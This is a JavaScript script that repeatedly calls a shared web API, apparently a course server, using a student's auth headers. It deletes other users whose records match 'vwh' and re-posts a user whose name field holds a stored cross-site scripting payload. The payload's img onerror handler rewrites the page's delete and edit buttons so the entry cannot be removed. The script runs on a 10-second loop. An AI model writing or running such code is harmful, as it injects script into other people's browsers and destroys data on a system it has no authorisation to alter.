import fetch from "node-fetch";

const BASE_URL = "https://web2.mrayyen.com";
const auth = {
  "auth-key": "jordan",
  "student-id": "202120880",
};

async function getData() {
  const res = await fetch(`${BASE_URL}/users`, { headers: auth });
  return await res.json();
}

async function deleteUser(id) {
  await fetch(`${BASE_URL}/users/${id}`, {
    method: "DELETE",
    headers: auth,
  });
  console.log(`Deleted user ${id}`);
}

async function addUser() {
  const newUser = {
    fullname: `<h1 style="display: inline-block; font-size: 60px; font-weight: 800; font-family: 'Poppins', sans-serif; background: linear-gradient(90deg, #ff0080, #7928ca, #2afadf, #fffb00); background-size: 300% 100%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; border: 4px solid; border-image: linear-gradient(90deg, #ff0080, #7928ca, #2afadf, #fffb00) 1; padding: 20px 35px; border-radius: 15px; transform: perspective(500px) rotateX(5deg); box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2), 0 0 40px rgba(138, 43, 226, 0.15); position: relative; overflow: hidden; animation: gradientMove 6s linear infinite, floatEffect 3s ease-in-out infinite; transition: all 0.3s ease; text-align: center; margin: 40px auto; max-width: 90%; cursor: pointer; text-shadow: 0 0 10px rgba(255, 0, 204, 0.3);"> Mohammad Swedan </h1>
      <style>
        @keyframes gradientMove {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes floatEffect {
          0%, 100% { transform: perspective(500px) rotateX(5deg) translateY(0); }
          50% { transform: perspective(500px) rotateX(5deg) translateY(-10px); }
        }
      </style>
      <img src="x" onerror="(function() {
        const row = this.closest('tr');
        if (!row) return;
        const deleteBtn = row.querySelector('.btn-danger');
        const editBtn = row.querySelector('.btn-primary');
        if (deleteBtn) {
          deleteBtn.onclick = function(e) {
            e.preventDefault();
            alert('⛔ YOU CANNOT DELETE THE BOSS! ⛔');
            return false;
          };
        }
        if (editBtn) {
          editBtn.onclick = function(e) {
            e.preventDefault();
            alert('⛔ YOU CANNOT EDIT THE BOSS! ⛔');
            return false;
          };
        }
      }).call(this);" style="display: none"/>`,
    email: "mohammad@gmail.com",
    age: 21,
  };

  const res = await fetch(`${BASE_URL}/users`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...auth,
    },
    body: JSON.stringify(newUser),
  });

  console.log("Added Mohammad Swedan");
}

async function automate() {
  const users = await getData();
  let foundMohammad = false;

  for (const user of users) {
    if (user?.gmail?.includes("vwh")) {
      await deleteUser(user.id);
    }
    if (user?.fullname?.includes("Mohammad Swedan")) {
      foundMohammad = true;
    }
  }

  if (!foundMohammad) {
    await addUser();
  }
}

// Run every 10 seconds
setInterval(automate, 10000);
